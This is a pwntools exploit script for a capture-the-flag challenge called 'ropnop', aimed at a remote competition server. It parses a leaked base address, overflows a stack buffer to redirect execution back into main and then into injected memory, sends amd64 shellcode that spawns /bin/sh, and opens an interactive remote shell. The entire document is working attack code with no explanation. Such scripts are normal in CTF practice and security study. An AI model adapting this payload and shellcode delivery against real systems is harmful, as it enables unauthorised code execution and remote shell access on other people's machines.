#!/usr/bin/env python3

from pwn import *
from sys import argv
import re

MAIN_TARGET_OFFSET = 0x5555555552bb - 0x555555554000

if "-" in argv[1:]:
    p = process("./ropnop")
    pause()
else:
    p = remote("hax1.allesctf.net", 9300)

leak = p.recvline()
bin_addr = int(re.findall(b"start: 0x(.*?) ", leak)[0], 16)

payload = b"A" * 16
payload += p64(bin_addr + 0x20)                 # rbp
payload += p64(bin_addr + MAIN_TARGET_OFFSET)   # ret addr 1 (back to read in main)
payload += cyclic_find(b"kaaa") * b"A"
payload += p64(bin_addr + 0x10)                 # ret addr 2 (shellcode)

p.send(payload)
sleep(1)

p.send(asm(shellcraft.amd64.linux.sh(), arch="amd64", os="linux"))
p.interactive()
